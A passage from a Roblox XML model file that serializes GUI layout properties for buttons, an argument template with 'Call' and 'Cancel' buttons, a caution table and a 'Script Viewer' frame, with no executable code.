									<XO>0</XO>
									<YS>0.625</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>20</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">+</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">24</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextButton" referent="RBXDC1BC346A4764B2C8592C1FFFE5E863A">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">4</token>
								<token name="FontSize">7</token>
								<bool name="Modal">false</bool>
								<string name="Name">Subtract</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.899999976</XS>
									<XO>0</XO>
									<YS>0.625</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>20</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">-</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">24</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="Frame" referent="RBX53B55CE2AC294BEEAB1067DFFEB90FB0">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4290756543</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<string name="Name">ArgumentTemplate</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">false</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="TextButton" referent="RBXF8751161669B46C9859972993DD59783">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">0.899999976</float>
									<Color3 name="BorderColor3">4278190080</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">6</token>
									<bool name="Modal">false</bool>
									<string name="Name">Type</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0.400000006</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text">Script</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextBox" referent="RBX302162DBE40A4260A5EDA693B322C19C">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">0.899999976</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClearTextOnFocus">true</bool>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<bool name="MultiLine">false</bool>
									<string name="Name">Value</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0.400000006</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<bool name="ShowNativeInput">true</bool>
									<UDim2 name="Size">
										<XS>0.600000024</XS>
										<XO>-12</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
						</Item>
						<Item class="TextButton" referent="RBX407562ADF5F14A45B2A992805F5C59FF">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">Cancel</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.524999976</XS>
									<XO>0</XO>
									<YS>1</YS>
									<YO>-40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0.400000006</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">Cancel</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextButton" referent="RBXB63976A743554006A14FF568E40D9B5B">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">Ok</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.075000003</XS>
									<XO>0</XO>
									<YS>1</YS>
									<YO>-40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0.400000006</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">Call</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="Frame" referent="RBXCACB7591020D44E48F1F7FEFE81F3967">
					<Properties>
						<bool name="Active">true</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4293519849</Color3>
						<float name="BackgroundTransparency">0</float>
						<Color3 name="BorderColor3">4287993237</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">true</bool>
						<string name="Name">TableCaution</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>0.300000012</XS>
							<XO>0</XO>
							<YS>0.300000012</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>350</XO>
							<YS>0</YS>
							<YO>20</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">false</bool>
						<int name="ZIndex">2</int>
					</Properties>
					<Item class="Frame" referent="RBXE750BF49A6BC4BADBE2DF2B86F453965">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">0.100000001</float>
							<Color3 name="BorderColor3">4290756543</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">MainWindow</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>150</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="TextButton" referent="RBXF0AAB484A68A4BDB89DF317E2470AD96">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">Ok</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0.300000012</XS>
									<XO>0</XO>
									<YS>1</YS>
									<YO>-40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0.400000006</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>30</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">Ok</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="ScrollingFrame" referent="RBXD7FBA6A94E174CCC961B1ED33C5194B8">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<Content name="BottomImage"><url>rbxasset://textures/blackBkg_square.png</url></Content>
								<Vector2 name="CanvasPosition">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<UDim2 name="CanvasSize">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<bool name="ClipsDescendants">true</bool>
								<bool name="Draggable">false</bool>
								<Content name="MidImage"><url>rbxasset://textures/blackBkg_square.png</url></Content>
								<string name="Name">TableResults</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<int name="ScrollBarThickness">12</int>
								<bool name="ScrollingEnabled">true</bool>
								<bool name="Selectable">true</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>80</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<Content name="TopImage"><url>rbxasset://textures/blackBkg_square.png</url></Content>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="Frame" referent="RBX31DEE57B2E7E4CCEB576F5A14BDAC679">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4290756543</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<string name="Name">TableTemplate</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">false</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="TextLabel" referent="RBX6142A1FD2E9C43CF8461F25F1507AD51">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">0.899999976</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">6</token>
									<string name="Name">Type</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0.400000006</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Script</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextLabel" referent="RBX186E7373C95B40AC9D2DBAF24042A52B">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">0.899999976</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">Value</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0.400000006</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0.600000024</XS>
										<XO>-12</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Script</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
						</Item>
					</Item>
					<Item class="TextLabel" referent="RBX98C67CEDFA594A8C99C78EE4DEEDBB06">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4288914085</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">5</token>
							<string name="Name">Title</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>1</YS>
								<YO>0</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">Caution</string>
							<Color3 name="TextColor3">4278190080</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">14</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">0</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
				</Item>
				<Item class="Frame" referent="RBX9920B0C700E54B81B7B6792556B09DA5">
					<Properties>
						<bool name="Active">true</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4293519849</Color3>
						<float name="BackgroundTransparency">0</float>
						<Color3 name="BorderColor3">4287993237</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">true</bool>
						<string name="Name">ScriptEditor</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>0.300000012</XS>
							<XO>0</XO>
							<YS>0.300000012</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>516</XO>
							<YS>0</YS>
							<YO>20</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">false</bool>
						<int name="ZIndex">5</int>
					</Properties>
					<Item class="TextLabel" referent="RBXAF53BC61D80F4E5BB59C67B792F85039">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4288914085</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">5</token>
							<string name="Name">Title</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>1</YS>
								<YO>0</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">Script Viewer</string>
							<Color3 name="TextColor3">4278190080</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">14</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">0</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">5</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX1825012F6E064D4A9A044A9796D167B3">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">0</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">Cover</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>3</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>516</XO>
								<YS>0</YS>
								<YO>416</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX6275573CCA18498AA616B7F1B91DD0D2">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">0</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">EditorGrid</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>3</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>500</XO>
								<YS>0</YS>
								<YO>400</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX2C6A93D054124B019F54465A19DD0DEF">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4293980400</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4287993237</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">TopBar</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>3</YS>
								<YO>0</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="ImageButton" referent="RBX381B7689E2844E338B0E4E6CE0F647A5">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">false</bool>
								<Color3 name="BackgroundColor3">4292730333</Color3>
